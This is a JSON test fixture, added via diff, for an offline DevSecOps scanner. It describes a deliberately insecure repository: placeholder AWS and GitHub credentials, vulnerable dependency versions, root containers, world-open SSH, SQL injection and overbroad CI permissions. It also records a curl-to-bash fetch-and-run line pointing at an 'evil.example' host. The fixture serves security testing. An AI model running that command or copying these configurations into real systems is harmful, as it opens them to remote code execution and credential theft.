@@ -1,0 +1,246 @@
+{
+  "_devsecops_fixture": true,
+  "_profile": "vulnerable",
+  "_description": "Enterprise DevSecOps multi-engine OFFLINE fixture — vulnerable profile. Sections are consumed by engines as they go active (D2+). D1 pack skeleton loads this file and registers all engines.",
+  "_schema_version": "1.0.0",
+  "repo": {
+    "name": "enterprise-app-vulnerable",
+    "default_branch": "main",
+    "visibility": "private",
+    "languages": ["python", "typescript", "terraform"]
+  },
+  "secrets": {
+    "gitleaks_findings": [],
+    "tracked_files_with_secrets": [
+      {
+        "path": ".env",
+        "matches": [
+          {
+            "rule": "generic-api-key",
+            "snippet": "AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
+            "line": 3
+          }
+        ]
+      },
+      {
+        "path": "src/config.py",
+        "matches": [
+          {
+            "rule": "aws-access-key-id",
+            "snippet": "AWS_ACCESS_KEY_ID = \"AKIAIOSFODNN7EXAMPLE\"",
+            "line": 12
+          }
+        ]
+      },
+      {
+        "path": "deploy/github_pat.txt",
+        "matches": [
+          {
+            "rule": "github-pat",
+            "snippet": "ghp_examplePersonalAccessTokenShouldNotBeCommitted000",
+            "line": 1
+          }
+        ]
+      }
+    ],
+    "ci_env_plaintext": [
+      {
+        "workflow": ".github/workflows/deploy.yml",
+        "key": "DB_PASSWORD",
+        "value_present": true
+      }
+    ],
+    "secret_scanning_enabled": false,
+    "history_scan_required": true
+  },
+  "sca": {
+    "manifests": [
+      {
+        "path": "requirements.txt",
+        "lockfile": null,
+        "packages": [
+          {"name": "django", "version": "2.2.0"},
+          {"name": "requests", "version": "2.18.0"},
+          {"name": "pyyaml", "version": "5.1"}
+        ]
+      },
+      {
+        "path": "package.json",
+        "lockfile": null,
+        "packages": [
+          {"name": "lodash", "version": "4.17.15"},
+          {"name": "minimist", "version": "0.2.1"}
+        ]
+      }
+    ],
+    "cves": [
+      {
+        "id": "CVE-2019-14234",
+        "package": "django",
+        "version": "2.2.0",
+        "severity": "critical",
+        "title": "Django SQL injection via JSONField/HStoreField"
+      },
+      {
+        "id": "CVE-2021-23337",
+        "package": "lodash",
+        "version": "4.17.15",
+        "severity": "high",
+        "title": "Command injection in lodash template"
+      }
+    ],
+    "dependabot_enabled": false,
+    "license_risks": []
+  },
+  "container": {
+    "dockerfiles": [
+      {
+        "path": "Dockerfile",
+        "base_image": "node:latest",
+        "user": null,
+        "runs_as_root": true,
+        "secrets_in_layers": false,
+        "healthcheck": false
+      },
+      {
+        "path": "services/api/Dockerfile",
+        "base_image": "python:3.9",
+        "user": "root",
+        "runs_as_root": true,
+        "add_all_context": true
+      }
+    ],
+    "images": [
+      {
+        "name": "enterprise-app:latest",
+        "os_vulns_critical": 3,
+        "os_vulns_high": 12,
+        "fixed_available": true
+      }
+    ]
+  },
+  "iac": {
+    "terraform": [
+      {
+        "path": "infra/main.tf",
+        "issues": [
+          {
+            "rule": "sg-ssh-world-open",
+            "severity": "critical",
+            "resource": "aws_security_group.web",
+            "detail": "ingress 0.0.0.0/0 tcp/22"
+          },
+          {
+            "rule": "s3-no-public-block",
+            "severity": "high",
+            "resource": "aws_s3_bucket.assets",
+            "detail": "public access block missing"
+          }
+        ]
+      }
+    ],
+    "kubernetes": [
+      {
+        "path": "k8s/deploy.yaml",
+        "issues": [
+          {
+            "rule": "privilege-escalation-allowed",
+            "severity": "high",
+            "detail": "allowPrivilegeEscalation: true"
+          },
+          {
+            "rule": "no-resource-limits",
+            "severity": "medium",
+            "detail": "containers missing cpu/memory limits"
+          }
+        ]
+      }
+    ],
+    "helm": []
+  },
+  "sast": {
+    "issues": [
+      {
+        "rule": "sql-injection-string-format",
+        "severity": "critical",
+        "path": "api/views.py",
+        "line": 88,
+        "detail": "SQL query built via f-string with user input"
+      },
+      {
+        "rule": "hardcoded-jwt-secret",
+        "severity": "high",
+        "path": "api/auth.py",
+        "line": 15,
+        "detail": "JWT_SECRET = 'dev-secret-change-me'"
+      }
+    ]
+  },
+  "cicd": {
+    "platform": "github_actions",
+    "workflows": [
+      {
+        "path": ".github/workflows/ci.yml",
+        "on": ["push", "pull_request"],
+        "jobs": ["build", "test"],
+        "security_jobs": [],
+        "permissions": "write-all",
+        "actions": [
+          {"uses": "actions/checkout@v4", "pinned_sha": false},
+          {"uses": "actions/setup-node@v4", "pinned_sha": false}
+        ],
+        "dangerous_patterns": ["curl-bash-install"]
+      },
+      {
+        "path": ".github/workflows/deploy.yml",
+        "on": ["push"],
+        "jobs": ["deploy"],
+        "security_jobs": [],
+        "permissions": "write-all",
+        "pull_request_target": false,
+        "secrets_in_env_plain": true,
+        "actions": [
+          {"uses": "docker/build-push-action@v5", "pinned_sha": false}
+        ],
+        "dangerous_patterns": ["unpinned-action", "overbroad-permissions"]
+      }
+    ],
+    "branch_protection": {
+      "main": {
+        "required_pull_request": false,
+        "required_status_checks": [],
+        "require_codeowner_review": false,
+        "allow_force_push": true
+      }
+    }
+  },
+  "supply_chain": {
+    "sbom_published": false,
+    "signed_images": false,
+    "slsa_level": 0,
+    "dependency_review_on_pr": false,
+    "install_scripts": [
+      {
+        "path": ".github/workflows/ci.yml",
+        "pattern": "curl https://evil.example/install.sh | bash"
+      }
+    ]
+  },
+  "policy": {
+    "opa_policies": [],
+    "conftest_present": false,
+    "admission_controls": false
+  },
+  "repo_gov": {
+    "codeowners": null,
+    "security_md": false,
+    "required_reviewers_for": [],
+    "default_workflow_permissions": "read-write"
+  },
+  "release": {
+    "artifact_retention_days": 1,
+    "provenance_attestations": false,
+    "environment_protection_rules": false,
+    "production_manual_approval": false
+  }
+}
